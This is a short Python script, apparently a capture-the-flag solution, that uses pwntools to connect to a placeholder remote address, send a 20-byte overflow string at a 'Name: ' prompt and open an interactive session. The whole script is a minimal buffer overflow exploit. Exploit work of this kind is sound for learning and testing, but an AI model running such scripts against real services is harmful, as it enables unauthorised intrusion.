from pwn import *
p = remote(ADDRESS, PORT)
payload = b"A"*20
p.sendlineafter("Name: ", payload)
p.interactive()